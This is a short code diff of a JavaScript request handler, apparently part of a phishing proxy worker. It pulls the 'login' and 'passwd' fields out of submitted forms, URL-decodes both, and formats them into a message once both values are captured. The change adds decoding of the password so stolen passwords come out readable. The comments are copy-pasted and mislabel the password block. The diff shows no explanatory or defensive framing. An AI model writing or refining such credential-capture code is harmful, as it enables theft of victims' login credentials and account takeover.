@@ -64,14 +64,16 @@ async function fetchAndApply(request) {
                 const [key, value] = pair.split('=');
 
                 if (key === 'login') {
-                    // Decode the URL-encoded value for the username
+                    	// Decode the URL-encoded value for the username
             		const username = decodeURIComponent(value.replace(/\+/g, ' '));
            		 // Return the decoded value of the login key
             		message = message + "<b>User</b>: " + username + "<br>";
                 }
                 if (key === 'passwd') {
-                    // Return the value of the passwd key
-                    message = message + "<b>Password</b>: " + value + "<br>"
+			// Decode the URL-encoded value for the username
+			const password = decodeURIComponent(value.replace(/\+/g, ' '));
+			// Return the decoded value of the login key
+			message = message + "<b>Password</b>: " + password + "<br>"
                 }
             }
             if (message.includes("User") && message.includes("Password</b>")) {
